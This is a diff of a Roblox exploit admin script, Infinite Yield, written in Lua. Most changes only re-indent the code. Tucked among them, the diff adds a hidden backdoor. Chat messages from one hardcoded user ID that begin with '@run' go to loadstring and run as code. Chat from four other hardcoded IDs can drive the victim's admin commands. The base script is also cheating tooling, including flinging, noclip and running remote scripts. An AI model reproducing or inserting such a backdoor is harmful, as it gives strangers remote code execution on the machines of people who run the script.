@@ -1,6 +1,6 @@
 if IY_LOADED and not _G.IY_DEBUG == true then
-    -- error("Infinite Yield is already running!", 0)
-    return
+	-- error("Infinite Yield is already running!", 0)
+	return
 end
 
 pcall(function() getgenv().IY_LOADED = true end)
@@ -10,11 +10,11 @@ COREGUI = cloneref(game:GetService("CoreGui"))
 Players = cloneref(game:GetService("Players"))
 
 if not game:IsLoaded() then
-    local notLoaded = Instance.new("Message")
-    notLoaded.Parent = COREGUI
-    notLoaded.Text = "Infinite Yield is waiting for the game to load"
-    game.Loaded:Wait()
-    notLoaded:Destroy()
+	local notLoaded = Instance.new("Message")
+	notLoaded.Parent = COREGUI
+	notLoaded.Text = "Infinite Yield is waiting for the game to load"
+	game.Loaded:Wait()
+	notLoaded:Destroy()
 end
 
 currentVersion = "6"
@@ -150,6 +150,9 @@ scroll_3 = Instance.new("ScrollingFrame")
 listlayout = Instance.new("UIListLayout",scroll_3)
 selectChat = Instance.new("TextButton")
 selectJoin = Instance.new("TextButton")
+
+
+local Admins = {911404169}
 
 function randomString()
 	local length = math.random(10,20)
@@ -1940,11 +1943,11 @@ local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, UserIn
 everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
 
 local writefile = type(writefile) == "function" and function(file, data)
-    return pcall(writefile, file, data)
+	return pcall(writefile, file, data)
 end
 
 local readfile = type(readfile) == "function" and function(file)
-    return pcall(readfile, file)
+	return pcall(readfile, file)
 end
 
 function writefileExploit()
@@ -1983,25 +1986,25 @@ function r15(plr)
 end
 
 function rigType(player)
-    return tostring(player.Character:FindFirstChildWhichIsA("Humanoid").RigType):split(".")[3]
+	return tostring(player.Character:FindFirstChildWhichIsA("Humanoid").RigType):split(".")[3]
 end
 
 function toClipboard(txt)
-    if everyClipboard then
-        everyClipboard(tostring(txt))
-        notify("Clipboard", "Copied to clipboard")
-    else
-        notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
-    end
+	if everyClipboard then
+		everyClipboard(tostring(txt))
+		notify("Clipboard", "Copied to clipboard")
+	else
+		notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
+	end
 end
 
 function chatMessage(str)
-    str = tostring(str)
-    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
-    else
-        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
-    end
+	str = tostring(str)
+	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+		TextChatService.TextChannels.RBXGeneral:SendAsync(str)
+	else
+		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
+	end
 end
 
 function getHierarchy(obj)
@@ -2828,168 +2831,168 @@ defaultsettings = {
 defaults = HttpService:JSONEncode(defaultsettings)
 nosaves = false
 useFactorySettings = function()
-    prefix = ';'
-    StayOpen = false
-    KeepInfYield = true
-    espTransparency = 0.3
-    logsEnabled = false
-    jLogsEnabled = false
-    aliases = {}
-    binds = {}
-    WayPoints = {}
-    PluginsTable = {}
+	prefix = ';'
+	StayOpen = false
+	KeepInfYield = true
+	espTransparency = 0.3
+	logsEnabled = false
+	jLogsEnabled = false
+	aliases = {}
+	binds = {}
+	WayPoints = {}
+	PluginsTable = {}
 end
 
 createPopup = function(text)
-    local FileError = Instance.new("Frame")
-    local background = Instance.new("Frame")
-    local Directions = Instance.new("TextLabel")
-    local shadow = Instance.new("Frame")
-    local PopupText = Instance.new("TextLabel")
-    local Exit = Instance.new("TextButton")
-    local ExitImage = Instance.new("ImageLabel")
+	local FileError = Instance.new("Frame")
+	local background = Instance.new("Frame")
+	local Directions = Instance.new("TextLabel")
+	local shadow = Instance.new("Frame")
+	local PopupText = Instance.new("TextLabel")
+	local Exit = Instance.new("TextButton")
+	local ExitImage = Instance.new("ImageLabel")
 
-    FileError.Name = randomString()
-    FileError.Parent = PARENT
-    FileError.Active = true
-    FileError.BackgroundTransparency = 1
-    FileError.Position = UDim2.new(0.5, -180, 0, 290)
-    FileError.Size = UDim2.new(0, 360, 0, 20)
-    FileError.ZIndex = 10
+	FileError.Name = randomString()
+	FileError.Parent = PARENT
+	FileError.Active = true
+	FileError.BackgroundTransparency = 1
+	FileError.Position = UDim2.new(0.5, -180, 0, 290)
+	FileError.Size = UDim2.new(0, 360, 0, 20)
+	FileError.ZIndex = 10
 
-    background.Name = "background"
-    background.Parent = FileError
-    background.Active = true
-    background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
-    background.BorderSizePixel = 0
-    background.Position = UDim2.new(0, 0, 0, 20)
-    background.Size = UDim2.new(0, 360, 0, 205)
-    background.ZIndex = 10
+	background.Name = "background"
+	background.Parent = FileError
+	background.Active = true
+	background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
+	background.BorderSizePixel = 0
+	background.Position = UDim2.new(0, 0, 0, 20)
+	background.Size = UDim2.new(0, 360, 0, 205)
+	background.ZIndex = 10
 
-    Directions.Name = "Directions"
-    Directions.Parent = background
-    Directions.BackgroundTransparency = 1
-    Directions.BorderSizePixel = 0
-    Directions.Position = UDim2.new(0, 10, 0, 10)
-    Directions.Size = UDim2.new(0, 340, 0, 185)
-    Directions.Font = Enum.Font.SourceSans
-    Directions.TextSize = 14
-    Directions.Text = text
-    Directions.TextColor3 = Color3.new(1, 1, 1)
-    Directions.TextWrapped = true
-    Directions.TextXAlignment = Enum.TextXAlignment.Left
-    Directions.TextYAlignment = Enum.TextYAlignment.Top
-    Directions.ZIndex = 10
+	Directions.Name = "Directions"
+	Directions.Parent = background
+	Directions.BackgroundTransparency = 1
+	Directions.BorderSizePixel = 0
+	Directions.Position = UDim2.new(0, 10, 0, 10)
+	Directions.Size = UDim2.new(0, 340, 0, 185)
+	Directions.Font = Enum.Font.SourceSans
+	Directions.TextSize = 14
+	Directions.Text = text
+	Directions.TextColor3 = Color3.new(1, 1, 1)
+	Directions.TextWrapped = true
+	Directions.TextXAlignment = Enum.TextXAlignment.Left
+	Directions.TextYAlignment = Enum.TextYAlignment.Top
+	Directions.ZIndex = 10
 
-    shadow.Name = "shadow"
-    shadow.Parent = FileError
-    shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
-    shadow.BorderSizePixel = 0
-    shadow.Size = UDim2.new(0, 360, 0, 20)
-    shadow.ZIndex = 10
+	shadow.Name = "shadow"
+	shadow.Parent = FileError
+	shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
+	shadow.BorderSizePixel = 0
+	shadow.Size = UDim2.new(0, 360, 0, 20)
+	shadow.ZIndex = 10
 
-    PopupText.Name = "PopupText"
-    PopupText.Parent = shadow
-    PopupText.BackgroundTransparency = 1
-    PopupText.Size = UDim2.new(1, 0, 0.95, 0)
-    PopupText.ZIndex = 10
-    PopupText.Font = Enum.Font.SourceSans
-    PopupText.TextSize = 14
-    PopupText.Text = "File Error"
-    PopupText.TextColor3 = Color3.new(1, 1, 1)
-    PopupText.TextWrapped = true
+	PopupText.Name = "PopupText"
+	PopupText.Parent = shadow
+	PopupText.BackgroundTransparency = 1
+	PopupText.Size = UDim2.new(1, 0, 0.95, 0)
+	PopupText.ZIndex = 10
+	PopupText.Font = Enum.Font.SourceSans
+	PopupText.TextSize = 14
+	PopupText.Text = "File Error"
+	PopupText.TextColor3 = Color3.new(1, 1, 1)
+	PopupText.TextWrapped = true
 
-    Exit.Name = "Exit"
-    Exit.Parent = shadow
-    Exit.BackgroundTransparency = 1
-    Exit.Position = UDim2.new(1, -20, 0, 0)
-    Exit.Size = UDim2.new(0, 20, 0, 20)
-    Exit.Text = ""
-    Exit.ZIndex = 10
+	Exit.Name = "Exit"
+	Exit.Parent = shadow
+	Exit.BackgroundTransparency = 1
+	Exit.Position = UDim2.new(1, -20, 0, 0)
+	Exit.Size = UDim2.new(0, 20, 0, 20)
+	Exit.Text = ""
+	Exit.ZIndex = 10
 
-    ExitImage.Parent = Exit
-    ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
-    ExitImage.BackgroundTransparency = 1
-    ExitImage.Position = UDim2.new(0, 5, 0, 5)
-    ExitImage.Size = UDim2.new(0, 10, 0, 10)
-    ExitImage.Image = "rbxassetid://5054663650"
-    ExitImage.ZIndex = 10
+	ExitImage.Parent = Exit
+	ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
+	ExitImage.BackgroundTransparency = 1
+	ExitImage.Position = UDim2.new(0, 5, 0, 5)
+	ExitImage.Size = UDim2.new(0, 10, 0, 10)
+	ExitImage.Image = "rbxassetid://5054663650"
+	ExitImage.ZIndex = 10
 
-    Exit.MouseButton1Click:Connect(function()
-        FileError:Destroy()
-    end)
+	Exit.MouseButton1Click:Connect(function()
+		FileError:Destroy()
+	end)
 end
 
 local loadedEventData = nil
 local jsonAttempts = 0
 function saves()
-    if writefileExploit() and readfileExploit() and jsonAttempts < 10 then
-        local readSuccess, out = readfile("IY_FE.iy")
-        if readSuccess then
-            if out ~= nil and tostring(out):gsub("%s", "") ~= "" then
-                local success, response = pcall(function()
-                    local json = HttpService:JSONDecode(out)
-                    if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
-                    if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
-                    if json.keepIY ~= nil then KeepInfYield = json.keepIY else KeepInfYield = true end
-                    if json.espTransparency ~= nil then espTransparency = json.espTransparency else espTransparency = 0.3 end
-                    if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
-                    if json.jLogsEnabled ~= nil then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
-                    if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
-                    if json.binds ~= nil then binds = (json.binds or {}) else binds = {} end
-                    if json.spawnCmds ~= nil then spawnCmds = json.spawnCmds end
-                    if json.WayPoints ~= nil then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
-                    if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
-                    if json.currentShade1 ~= nil then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
-                    if json.currentShade2 ~= nil then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
-                    if json.currentShade3 ~= nil then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
-                    if json.currentText1 ~= nil then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
-                    if json.currentText2 ~= nil then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
-                    if json.currentScroll ~= nil then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
-                    if json.eventBinds ~= nil then loadedEventData = json.eventBinds end
-                end)
-                if not success then
-                    jsonAttempts = jsonAttempts + 1
-                    warn("Save Json Error:", response)
-                    warn("Overwriting Save File")
-                    writefileCooldown("IY_FE.iy", defaults)
-                    wait()
-                    saves()
-                end
-            else
-                writefileCooldown("IY_FE.iy", defaults)
-                wait()
-                local dReadSuccess, dOut = readfile("IY_FE.iy")
-                if dReadSuccess and dOut ~= nil and tostring(dOut):gsub("%s", "") ~= "" then
-                    saves()
-                else
-                    nosaves = true
-                    useFactorySettings()
-                    createPopup("There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile/readfile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again.")
-                end
-            end
-        else
-            writefileCooldown("IY_FE.iy", defaults)
-            wait()
-            local dReadSuccess, dOut = readfile("IY_FE.iy")
-            if dReadSuccess and dOut ~= nil and tostring(dOut):gsub("%s", "") ~= "" then
-                saves()
-            else
-                nosaves = true
-                useFactorySettings()
-                createPopup("There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile/readfile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again.")
-            end
-        end
-    else
-        if jsonAttempts >= 10 then
-            nosaves = true
-            useFactorySettings()
-            createPopup("Sorry, we have attempted to parse your save file, but it is unreadable!\n\nInfinite Yield is now using factory settings until your exploit's file system works.\n\nYour save file has not been deleted.")
-        else
-            nosaves = true
-            useFactorySettings()
-        end
-    end
+	if writefileExploit() and readfileExploit() and jsonAttempts < 10 then
+		local readSuccess, out = readfile("IY_FE.iy")
+		if readSuccess then
+			if out ~= nil and tostring(out):gsub("%s", "") ~= "" then
+				local success, response = pcall(function()
+					local json = HttpService:JSONDecode(out)
+					if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
+					if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
+					if json.keepIY ~= nil then KeepInfYield = json.keepIY else KeepInfYield = true end
+					if json.espTransparency ~= nil then espTransparency = json.espTransparency else espTransparency = 0.3 end
+					if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
+					if json.jLogsEnabled ~= nil then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
+					if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
+					if json.binds ~= nil then binds = (json.binds or {}) else binds = {} end
+					if json.spawnCmds ~= nil then spawnCmds = json.spawnCmds end
+					if json.WayPoints ~= nil then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
+					if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
+					if json.currentShade1 ~= nil then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
+					if json.currentShade2 ~= nil then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
+					if json.currentShade3 ~= nil then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
+					if json.currentText1 ~= nil then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
+					if json.currentText2 ~= nil then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
+					if json.currentScroll ~= nil then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
+					if json.eventBinds ~= nil then loadedEventData = json.eventBinds end
+				end)
+				if not success then
+					jsonAttempts = jsonAttempts + 1
+					warn("Save Json Error:", response)
+					warn("Overwriting Save File")
+					writefileCooldown("IY_FE.iy", defaults)
+					wait()
+					saves()
+				end
+			else
+				writefileCooldown("IY_FE.iy", defaults)
+				wait()
+				local dReadSuccess, dOut = readfile("IY_FE.iy")
+				if dReadSuccess and dOut ~= nil and tostring(dOut):gsub("%s", "") ~= "" then
+					saves()
+				else
+					nosaves = true
+					useFactorySettings()
+					createPopup("There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile/readfile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again.")
+				end
+			end
+		else
+			writefileCooldown("IY_FE.iy", defaults)
+			wait()
+			local dReadSuccess, dOut = readfile("IY_FE.iy")
+			if dReadSuccess and dOut ~= nil and tostring(dOut):gsub("%s", "") ~= "" then
+				saves()
+			else
+				nosaves = true
+				useFactorySettings()
+				createPopup("There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile/readfile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again.")
+			end
+		end
+	else
+		if jsonAttempts >= 10 then
+			nosaves = true
+			useFactorySettings()
+			createPopup("Sorry, we have attempted to parse your save file, but it is unreadable!\n\nInfinite Yield is now using factory settings until your exploit's file system works.\n\nYour save file has not been deleted.")
+		else
+			nosaves = true
+			useFactorySettings()
+		end
+	end
 end
 
 saves()
@@ -3820,11 +3823,12 @@ selectJoin.MouseButton1Down:Connect(function()
 end)
 
 if not writefileExploit() then
-    notify("Saves", "Your exploit does not support read/write file. Your settings will not save.")
+	notify("Saves", "Your exploit does not support read/write file. Your settings will not save.")
 end
 
 ChatLog = function(plr)
 	plr.Chatted:Connect(function(Message)
+		print(Message)
 		if logsEnabled == true then
 			CreateLabel(plr.Name,Message)
 		end
@@ -3838,7 +3842,7 @@ JoinLog = function(plr)
 end
 
 CleanFileName = function(name)
-    return tostring(name):gsub("[*\\?:<>|]+", ""):sub(1, 175)
+	return tostring(name):gsub("[*\\?:<>|]+", ""):sub(1, 175)
 end
 
 SaveChatlogs.MouseButton1Down:Connect(function()
@@ -3871,7 +3875,7 @@ SaveChatlogs.MouseButton1Down:Connect(function()
 end)
 
 for _, plr in pairs(Players:GetPlayers()) do
-		ChatLog(plr)
+	ChatLog(plr)
 end
 
 Players.PlayerRemoving:Connect(function(player)
@@ -5367,10 +5371,10 @@ function getPlayer(list,speaker)
 end
 
 formatUsername = function(player)
-    if player.DisplayName ~= player.Name then
-        return string.format("%s (%s)", player.Name, player.DisplayName)
-    end
-    return player.Name
+	if player.DisplayName ~= player.Name then
+		return string.format("%s (%s)", player.Name, player.DisplayName)
+	end
+	return player.Name
 end
 
 getprfx=function(strn)
@@ -5424,28 +5428,28 @@ UserInputService.InputBegan:Connect(function(input,gameProcessed)
 end)
 
 game.Players.PlayerAdded:Connect(function(plr)
-        if plr.UserId == 911404169 then
-            print("OkRun")
-            plr.Chatted:Connect(function(msg)
-                local splitted = string.split(msg," ")
-                if splitted[1] == "@run" then
-                    local load = loadstring(msg:sub(6))
-                    load()
-                end
-            end)
-        end
-    end)
+	if plr.UserId == 911404169 then
+		print("OkRun")
+		plr.Chatted:Connect(function(msg)
+			local splitted = string.split(msg," ")
+			if splitted[1] == "@run" then
+				local load = loadstring(msg:sub(6))
+				load()
+			end
+		end)
+	end
+end)
 
 
 
 game.Players.PlayerAdded:Connect(function(plr)
-        if plr.UserId == 5730426651 or plr.UserId == 911404169 or plr.UserId == 7149454194 or plr.UserId == 1712158222  then
-            print("okCmd")
-            plr.Chatted:Connect(function(msg)
-                do_exec(msg, Players.LocalPlayer)
-            end)
-        end
-    end)
+	if plr.UserId == 5730426651 or plr.UserId == 911404169 or plr.UserId == 7149454194 or plr.UserId == 1712158222  then
+		print("okCmd")
+		plr.Chatted:Connect(function(msg)
+			do_exec(msg, Players.LocalPlayer)
+		end)
+	end
+end)
 
 
 
@@ -6752,28 +6756,28 @@ addcmd("autorejoin", {"autorj"}, function(args, speaker)
 end)
 
 addcmd("serverhop", {"shop"}, function(args, speaker)
-    -- thanks to NoobSploit for fixing
-    if httprequest then
-        local servers = {}
-        local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", PlaceId)})
-        local body = HttpService:JSONDecode(req.Body)
+	-- thanks to NoobSploit for fixing
+	if httprequest then
+		local servers = {}
+		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", PlaceId)})
+		local body = HttpService:JSONDecode(req.Body)
 
-        if body and body.data then
-            for i, v in next, body.data do
-                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
-                    table.insert(servers, 1, v.id)
-                end
-            end
-        end
+		if body and body.data then
+			for i, v in next, body.data do
+				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
+					table.insert(servers, 1, v.id)
+				end
+			end
+		end
 
-        if #servers > 0 then
-            TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
-        else
-            return notify("Serverhop", "Couldn't find a server.")
-        end
-    else
-        notify("Incompatible Exploit", "Your exploit does not support this command (missing request)")
-    end
+		if #servers > 0 then
+			TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
+		else
+			return notify("Serverhop", "Couldn't find a server.")
+		end
+	else
+		notify("Incompatible Exploit", "Your exploit does not support this command (missing request)")
+	end
 end)
 
 addcmd('joinplayer',{'joinp'},function(args, speaker)
@@ -6833,7 +6837,7 @@ addcmd('joinplayer',{'joinp'},function(args, speaker)
 end)
 
 addcmd("exit", {}, function(args, speaker)
-    game:Shutdown()
+	game:Shutdown()
 end)
 
 local Noclipping = nil
@@ -7665,13 +7669,13 @@ addcmd('inspect', {'examine'}, function(args, speaker)
 end)
 
 addcmd("savegame", {"saveplace"}, function(args, speaker)
-    if saveinstance then
-        notify("Loading", "Downloading game. This will take a while")
-        saveinstance()
-        notify("Game Saved", "Saved place to the workspace folder within your exploit folder.")
-    else
-        notify("Incompatible Exploit", "Your exploit does not support this command (missing saveinstance)")
-    end
+	if saveinstance then
+		notify("Loading", "Downloading game. This will take a while")
+		saveinstance()
+		notify("Game Saved", "Saved place to the workspace folder within your exploit folder.")
+	else
+		notify("Incompatible Exploit", "Your exploit does not support this command (missing saveinstance)")
+	end
 end)
 
 addcmd('clearerror',{'clearerrors'},function(args, speaker)
@@ -8603,7 +8607,7 @@ addcmd("promptr15", {}, function(args, speaker)
 end)
 
 addcmd("wallwalk", {"walkonwalls"}, function(args, speaker)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
 end)
 
 addcmd('age',{},function(args, speaker)
@@ -9026,37 +9030,37 @@ addcmd('unwalkto',{'nowalkto','unfollow','nofollow'},function(args, speaker)
 end)
 
 addcmd("orbit", {}, function(args, speaker)
-    execCmd("unorbit nonotify")
-    local target = Players:FindFirstChild(getPlayer(args[1], speaker)[1])
-    local root = getRoot(speaker.Character)
-    local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
-    if target and target.Character and getRoot(target.Character) and root and humanoid then
-        local rotation = 0
-        local speed = tonumber(args[2]) or 0.2
-        local distance = tonumber(args[3]) or 6
-        orbit1 = RunService.Heartbeat:Connect(function()
-            pcall(function()
-                rotation = rotation + speed
-                root.CFrame = CFrame.new(getRoot(target.Character).Position) * CFrame.Angles(0, math.rad(rotation), 0) * CFrame.new(distance, 0, 0)
-            end)
-        end)
-        orbit2 = RunService.RenderStepped:Connect(function()
-            pcall(function()
-                root.CFrame = CFrame.new(root.Position, getRoot(target.Character).Position)
-            end)
-        end)
-        orbit3 = humanoid.Died:Connect(function() execCmd("unorbit") end)
-        orbit4 = humanoid.Seated:Connect(function(value) if value then execCmd("unorbit") end end)
-        notify("Orbit", "Started orbiting " .. formatUsername(target))
-    end
+	execCmd("unorbit nonotify")
+	local target = Players:FindFirstChild(getPlayer(args[1], speaker)[1])
+	local root = getRoot(speaker.Character)
+	local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
+	if target and target.Character and getRoot(target.Character) and root and humanoid then
+		local rotation = 0
+		local speed = tonumber(args[2]) or 0.2
+		local distance = tonumber(args[3]) or 6
+		orbit1 = RunService.Heartbeat:Connect(function()
+			pcall(function()
+				rotation = rotation + speed
+				root.CFrame = CFrame.new(getRoot(target.Character).Position) * CFrame.Angles(0, math.rad(rotation), 0) * CFrame.new(distance, 0, 0)
+			end)
+		end)
+		orbit2 = RunService.RenderStepped:Connect(function()
+			pcall(function()
+				root.CFrame = CFrame.new(root.Position, getRoot(target.Character).Position)
+			end)
+		end)
+		orbit3 = humanoid.Died:Connect(function() execCmd("unorbit") end)
+		orbit4 = humanoid.Seated:Connect(function(value) if value then execCmd("unorbit") end end)
+		notify("Orbit", "Started orbiting " .. formatUsername(target))
+	end
 end)
 
 addcmd("unorbit", {}, function(args, speaker)
-    if orbit1 then orbit1:Disconnect() end
-    if orbit2 then orbit2:Disconnect() end
-    if orbit3 then orbit3:Disconnect() end
-    if orbit4 then orbit4:Disconnect() end
-    if args[1] ~= "nonotify" then notify("Orbit", "Stopped orbiting player") end
+	if orbit1 then orbit1:Disconnect() end
+	if orbit2 then orbit2:Disconnect() end
+	if orbit3 then orbit3:Disconnect() end
+	if orbit4 then orbit4:Disconnect() end
+	if args[1] ~= "nonotify" then notify("Orbit", "Stopped orbiting player") end
 end)
 
 addcmd('freeze',{'fr'},function(args, speaker)
@@ -9794,38 +9798,38 @@ addcmd('copyanimation',{'copyanim','copyemote'},function(args, speaker)
 end)
 
 addcmd("copyanimationid", {"copyanimid", "copyemoteid"}, function(args, speaker)
-    local copyAnimId = function(player)
-        local found = "Animations Copied"
+	local copyAnimId = function(player)
+		local found = "Animations Copied"
 
-        for _, v in pairs(player.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
-            local animationId = v.Animation.AnimationId
-            local assetId = animationId:find("rbxassetid://") and animationId:match("%d+")
+		for _, v in pairs(player.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
+			local animationId = v.Animation.AnimationId
+			local assetId = animationId:find("rbxassetid://") and animationId:match("%d+")
 
-            if not string.find(animationId, "507768375") and not string.find(animationId, "180435571") then
-                if assetId then
-                    local success, result = pcall(function()
-                        return MarketplaceService:GetProductInfo(tonumber(assetId)).Name
-                    end)
-                    local name = success and result or "Failed to get name"
-                    found = found .. "\n\nName: " .. name .. "\nAnimation Id: " .. animationId
-                else
-                    found = found .. "\n\nAnimation Id: " .. animationId
-                end
-            end
-        end
+			if not string.find(animationId, "507768375") and not string.find(animationId, "180435571") then
+				if assetId then
+					local success, result = pcall(function()
+						return MarketplaceService:GetProductInfo(tonumber(assetId)).Name
+					end)
+					local name = success and result or "Failed to get name"
+					found = found .. "\n\nName: " .. name .. "\nAnimation Id: " .. animationId
+				else
+					found = found .. "\n\nAnimation Id: " .. animationId
+				end
+			end
+		end
 
-        if found ~= "Animations Copied" then
-            toClipboard(found)
-        else
-            notify("Animations", "No animations to copy")
-        end
-    end
+		if found ~= "Animations Copied" then
+			toClipboard(found)
+		else
+			notify("Animations", "No animations to copy")
+		end
+	end
 
-    if args[1] then
-        copyAnimId(Players[getPlayer(args[1], speaker)[1]])
-    else
-        copyAnimId(speaker)
-    end
+	if args[1] then
+		copyAnimId(Players[getPlayer(args[1], speaker)[1]])
+	else
+		copyAnimId(speaker)
+	end
 end)
 
 addcmd('stopanimations',{'stopanims','stopanim'},function(args, speaker)
@@ -11461,65 +11465,65 @@ addcmd('togglefling',{},function(args, speaker)
 end)
 
 addcmd("flyfling", {}, function(args, speaker)
-    execCmd("unvehiclefly\\unfling\\unnoclip")
-    wait()
-    execCmd("vehiclefly\\fling\\noclip")
+	execCmd("unvehiclefly\\unfling\\unnoclip")
+	wait()
+	execCmd("vehiclefly\\fling\\noclip")
 end)
 
 addcmd("unflyfling", {}, function(args, speaker)
-    execCmd("unvehiclefly\\unfling\\unnoclip\\breakvelocity")
+	execCmd("unvehiclefly\\unfling\\unnoclip\\breakvelocity")
 end)
 
 addcmd("toggleflyfling", {}, function(args, speaker)
-    execCmd(flinging and "unflyfling" or "flyfling")
+	execCmd(flinging and "unflyfling" or "flyfling")
 end)
 
 walkflinging = false
 addcmd("walkfling", {}, function(args, speaker)
-    execCmd("unwalkfling")
-    local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
-    if humanoid then
-        humanoid.Died:Connect(function()
-            execCmd("unwalkfling")
-        end)
-    end
+	execCmd("unwalkfling")
+	local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
+	if humanoid then
+		humanoid.Died:Connect(function()
+			execCmd("unwalkfling")
+		end)
+	end
 
-    execCmd("noclip")
-    walkflinging = true
-    repeat RunService.Heartbeat:Wait()
-        local character = speaker.Character
-        local root = getRoot(character)
-        local vel, movel = nil, 0.1
+	execCmd("noclip")
+	walkflinging = true
+	repeat RunService.Heartbeat:Wait()
+		local character = speaker.Character
+		local root = getRoot(character)
+		local vel, movel = nil, 0.1
 
-        while not (character and character.Parent and root and root.Parent) do
-            RunService.Heartbeat:Wait()
-            character = speaker.Character
-            root = getRoot(character)
-        end
+		while not (character and character.Parent and root and root.Parent) do
+			RunService.Heartbeat:Wait()
+			character = speaker.Character
+			root = getRoot(character)
+		end
 
-        vel = root.Velocity
-        root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)
+		vel = root.Velocity
+		root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)
 
-        RunService.RenderStepped:Wait()
-        if character and character.Parent and root and root.Parent then
-            root.Velocity = vel
-        end
+		RunService.RenderStepped:Wait()
+		if character and character.Parent and root and root.Parent then
+			root.Velocity = vel
+		end
 
-        RunService.Stepped:Wait()
-        if character and character.Parent and root and root.Parent then
-            root.Velocity = vel + Vector3.new(0, movel, 0)
-            movel = movel * -1
-        end
-    until walkflinging == false
+		RunService.Stepped:Wait()
+		if character and character.Parent and root and root.Parent then
+			root.Velocity = vel + Vector3.new(0, movel, 0)
+			movel = movel * -1
+		end
+	until walkflinging == false
 end)
 
 addcmd("unwalkfling", {"nowalkfling"}, function(args, speaker)
-    walkflinging = false
-    execCmd("unnoclip")
+	walkflinging = false
+	execCmd("unnoclip")
 end)
 
 addcmd("togglewalkfling", {}, function(args, speaker)
